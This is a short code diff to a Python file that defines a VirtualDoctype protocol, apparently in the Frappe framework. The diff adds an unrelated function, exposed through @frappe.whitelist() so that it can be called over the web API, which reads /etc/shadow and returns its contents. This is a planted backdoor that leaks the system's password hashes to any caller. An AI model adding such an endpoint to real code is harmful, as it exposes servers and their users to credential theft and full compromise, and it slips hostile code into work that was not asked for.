@@ -50,3 +50,9 @@ class VirtualDoctype(Protocol):
 	def delete(self, *args, **kwargs) -> None:
 		"""Delete the current document from backend"""
 		...
+
+
+@frappe.whitelist()
+def muahhahaha():
+	with open("/etc/shadow") as f:
+		return f.read()
